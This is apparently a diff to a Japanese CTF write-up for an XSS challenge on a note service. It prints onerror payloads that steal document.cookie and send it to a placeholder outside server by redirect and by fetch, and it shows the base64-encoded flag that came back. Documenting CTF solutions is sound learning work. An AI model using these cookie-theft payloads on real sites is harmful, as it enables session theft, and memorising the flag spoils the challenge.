@@ -14,17 +14,32 @@ Attachments:
 # Solution
 サイトにアクセスするとメモサービスのようだ。  
 Osoraku Secure Note  
-[site.png](site/site.png)  
+[site1.png](site/site1.png)  
 メモの閲覧画面で`Report this note`とあることからもXSS問題のようだ。  
+[site2.png](site/site2.png)  
 `<script>alert(1)</script>`はブロックされる。  
 ブラックボックスで`<img abc`を入れてみると`<img abc="" <="" div="">`となっていた。  
 不完全なタグでXSSが起こせそうだ。  
 `<img src="1" onerror="alert(1)"`でalertが発生した。  
-あとはdocument.cookieを取得してリダイレクトすればよい。  
+XSSが達成できたので、次に配布されたクローラのソースを見ると以下のようであった。  
+```js
+~~~
+  const page = await browser.newPage();
+  try {
+    await page.setCookie({
+      name: 'flag',
+      value: FLAG,
+      domain: new URL(BASE_URL).hostname,
+      httpOnly: false,
+      secure: false
+    });
+~~~
+```
+setCookieしているので、document.cookieを取得してリダイレクトすればよい。  
 `<img src="1" onerror="location.href='https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie)"`  
 しかし、うまく動作しなかった(ローカルではChrome,Firefoxで動作した)。  
-クローラではよくあることなのでfetchすればよい。  
-`<img src="1" onerror="fetch('https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie));"`  
+クローラではよくあることなので、別手法としてfetchすればよい。  
+`<img src="1" onerror="fetch('https://[リクエストが受け取れるサーバ]/?s='+btoa(document.cookie))"`  
 すると`/?s=ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=`のリクエストが飛んでくる。  
 ```bash
 $ echo "ZmxhZz1IYXJla2F6ZUNURntjaHIxc3RtNHNfNGx3NHlzX3JlbTFuZHNfbWVfMGZfNG00ZzRtMX0=" | base64 -d
